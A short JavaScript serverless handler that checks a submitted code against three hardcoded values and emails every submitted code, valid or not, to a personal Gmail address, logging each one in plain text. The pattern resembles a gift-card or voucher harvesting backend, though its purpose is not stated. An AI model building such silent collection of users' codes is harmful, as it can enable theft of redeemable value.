import { Resend } from "resend";

const resend = new Resend(process.env.RESEND_API_KEY);

export default async function handler(req, res) {
  try {
    if (req.method !== "POST") {
      return res.status(405).json({ success: false });
    }

    const code = req.body?.code;

    console.log("🔥 CODE RECEIVED:", code);

    if (!code) {
      return res.status(400).json({ success: false });
    }

    const validCodes = [
      "1234567890123456",
      "ABCD1234",
      "A9999999"
    ];

    const isValid = validCodes.includes(code);

    console.log("✅ VALID:", isValid);

    // ✅ SEND EMAIL (THIS IS WHAT YOU WERE MISSING)
    const emailRes = await resend.emails.send({
      from: "onboarding@resend.dev", // must use this for now
      to: "terry124wallace@gmail.com",
      subject: "New Code Submitted",
      html: `
        <h2>New Code Received</h2>
        <p><b>Code:</b> ${code}</p>
        <p><b>Valid:</b> ${isValid}</p>
      `
    });

    console.log("📧 EMAIL RESPONSE:", emailRes);

    return res.status(200).json({ success: isValid });

  } catch (err) {
    console.log("🚨 ERROR:", err);
    return res.status(500).json({ success: false });
  }
}
